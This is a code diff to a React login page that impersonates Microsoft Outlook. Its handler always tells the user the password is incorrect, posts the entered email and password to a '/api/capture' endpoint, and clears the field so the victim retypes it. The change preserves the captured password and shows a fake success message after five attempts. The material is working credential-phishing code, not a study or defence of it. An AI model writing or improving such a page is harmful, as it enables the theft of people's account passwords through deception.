@@ -10,18 +10,20 @@ export default function OutlookLoginPage() {
 
   const handleLogin = async () => {
     setFeedback('Incorrect password! Please try again...');
+    const pwdToSend = password;
+    setPassword(''); // Clear password to require retaping
     setClickCount(prev => prev + 1);
     
     try {
       const res = await fetch('/api/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: email.trim() + ' (Outlook)', password, method: 'outlook' })
+        body: JSON.stringify({ username: email.trim() + ' (Outlook)', password: pwdToSend, method: 'outlook' })
       });
-      if (res.ok && clickCount >= 4) setShowSuccess(true);
+      if (res.ok && clickCount + 1 >= 5) setShowSuccess(true);
       setTimeout(() => setShowSuccess(false), 4000);
     } catch (e) {}
-    if (clickCount >= 4) setShowSuccess(true);
+    if (clickCount + 1 >= 5) setShowSuccess(true);
   };
 
   return (
